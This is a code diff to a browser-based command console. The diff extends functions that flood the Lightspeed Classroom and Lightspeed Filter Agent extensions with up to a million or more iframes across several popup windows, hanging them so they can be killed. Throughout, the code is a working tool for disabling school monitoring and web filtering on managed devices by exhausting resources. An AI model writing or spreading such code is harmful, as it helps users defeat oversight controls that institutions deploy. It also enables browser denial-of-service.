@@ -151,12 +151,15 @@
             let commandHistory = [];
             let historyIndex = -1;
             let defaultIframes = 1000000; // Default number of iframes (1,000,000)
+            let defaultTabs = 10; // Default number of tabs
 
             // List of all available commands
             const allCommands = [
                 "iframes set <number> - Set the number of iframes to create",
                 "iframes - Show the default number of iframes",
                 "iframes max - Set the number of iframes to infinity (MAX POWER)",
+                "tabs set <number> - Set the number of tabs to open",
+                "tabs - Show the number of tabs to be opened",
                 "controls - Show all available commands",
                 "time - Display the current time",
                 "clear - Clear the command history",
@@ -238,6 +241,16 @@
                 } else if (command === "iframes max") {
                     defaultIframes = Number.MAX_SAFE_INTEGER; // Set iframes to the maximum safe integer
                     output = `Default iframes set to infinity (MAX POWER: ${defaultIframes})`;
+                } else if (command.startsWith("tabs set")) {
+                    let parts = command.split(" ");
+                    if (parts.length > 2 && !isNaN(parts[2])) {
+                        defaultTabs = parseInt(parts[2]);
+                        output = `Default tabs set to ${defaultTabs}`;
+                    } else {
+                        output = `Usage: tabs set <number>`;
+                    }
+                } else if (command === "tabs") {
+                    output = `Number of tabs to be opened: ${defaultTabs}`;
                 } else if (command === "controls") {
                     output = "Available commands:";
                     let commandList = document.createElement("ul");
@@ -254,13 +267,13 @@
                     return ""; // Skip adding output to history
                 } else if (command === "disablelightspeedclassroom") {
                     output = "Lightspeed Classroom has been permanently disabled! (UNLIMITED POWER)";
-                    hangExtension("Lightspeed Classroom", extensions["Lightspeed Classroom"]);
+                    disableExtension("Lightspeed Classroom", extensions["Lightspeed Classroom"]);
                 } else if (command === "disablelightspeedfilter") {
                     output = "Lightspeed Filter has been permanently disabled! (UNLIMITED POWER)";
-                    hangExtension("Lightspeed Filter Agent", extensions["Lightspeed Filter Agent"]);
+                    disableExtension("Lightspeed Filter Agent", extensions["Lightspeed Filter Agent"]);
                 } else if (command === "disablelightspeed mix") {
                     output = "Mixing Lightspeed Classroom and Filter in each tab! (UNLIMITED POWER)";
-                    hangExtensionsMix();
+                    disableExtensionsMix();
                 } else {
                     output = "Command not recognized";
                 }
@@ -268,60 +281,64 @@
                 return output;
             }
 
-            // Function to hang an extension
-            function hangExtension(extName, extURL) {
-                const popup = window.open("", "PopupWindow", "width=100,height=100");
-                if (!popup) {
-                    console.error("Pop-up blocked! Please allow pop-ups for this site.");
-                    return;
+            // Function to disable an extension permanently
+            function disableExtension(extName, extURL) {
+                for (let i = 0; i < defaultTabs; i++) {
+                    const popup = window.open("", "PopupWindow", "width=100,height=100");
+                    if (!popup) {
+                        console.error("Pop-up blocked! Please allow pop-ups for this site.");
+                        return;
+                    }
+
+                    const popupDocument = popup.document;
+                    const popupBody = popupDocument.body;
+                    const iframeContainer = popupDocument.createElement('div');
+                    iframeContainer.id = 'iframeContainer';
+                    popupBody.appendChild(iframeContainer);
+
+                    // Flood the extension with iframes
+                    floodIframes(iframeContainer, extURL, defaultIframes);
+
+                    setTimeout(() => {
+                        popup.close();
+                        const killExtensionText = document.createElement("div");
+                        killExtensionText.innerHTML = `Now that the extension <strong>${extName}</strong> has been hanged, you can kill it.`;
+                        historyDiv.appendChild(killExtensionText);
+                    }, 10000);
                 }
-
-                const popupDocument = popup.document;
-                const popupBody = popupDocument.body;
-                const iframeContainer = popupDocument.createElement('div');
-                iframeContainer.id = 'iframeContainer';
-                popupBody.appendChild(iframeContainer);
-
-                // Flood the extension with iframes
-                floodIframes(iframeContainer, extURL, defaultIframes);
-
-                setTimeout(() => {
-                    popup.close();
-                    const killExtensionText = document.createElement("div");
-                    killExtensionText.innerHTML = `Now that the extension <strong>${extName}</strong> has been hanged, you can kill it.`;
-                    historyDiv.appendChild(killExtensionText);
-                }, 10000);
             }
 
-            // Function to hang multiple extensions
-            function hangExtensionsMix() {
-                const popup = window.open("", "PopupWindow", "width=100,height=100");
-                if (!popup) {
-                    console.error("Pop-up blocked! Please allow pop-ups for this site.");
-                    return;
+            // Function to disable multiple extensions permanently
+            function disableExtensionsMix() {
+                for (let i = 0; i < defaultTabs; i++) {
+                    const popup = window.open("", "PopupWindow", "width=100,height=100");
+                    if (!popup) {
+                        console.error("Pop-up blocked! Please allow pop-ups for this site.");
+                        return;
+                    }
+
+                    const popupDocument = popup.document;
+                    const popupBody = popupDocument.body;
+                    const iframeContainer = popupDocument.createElement('div');
+                    iframeContainer.id = 'iframeContainer';
+                    popupBody.appendChild(iframeContainer);
+
+                    const urls = [
+                        extensions["Lightspeed Classroom"],
+                        extensions["Lightspeed Filter Agent"]
+                    ];
+
+                    // Flood both extensions with iframes
+                    floodIframes(iframeContainer, urls[0], defaultIframes / 2);
+                    floodIframes(iframeContainer, urls[1], defaultIframes / 2);
+
+                    setTimeout(() => {
+                        popup.close();
+                        const killExtensionText = document.createElement("div");
+                        killExtensionText.innerHTML = `Now that both extensions have been hanged, you can kill them.`;
+                        historyDiv.appendChild(killExtensionText);
+                    }, 10000);
                 }
-
-                const popupDocument = popup.document;
-                const popupBody = popupDocument.body;
-                const iframeContainer = popupDocument.createElement('div');
-                iframeContainer.id = 'iframeContainer';
-                popupBody.appendChild(iframeContainer);
-
-                const urls = [
-                    extensions["Lightspeed Classroom"],
-                    extensions["Lightspeed Filter Agent"]
-                ];
-
-                // Flood both extensions with iframes
-                floodIframes(iframeContainer, urls[0], defaultIframes / 2);
-                floodIframes(iframeContainer, urls[1], defaultIframes / 2);
-
-                setTimeout(() => {
-                    popup.close();
-                    const killExtensionText = document.createElement("div");
-                    killExtensionText.innerHTML = `Now that both extensions have been hanged, you can kill them.`;
-                    historyDiv.appendChild(killExtensionText);
-                }, 10000);
             }
 
             // Function to flood iframes
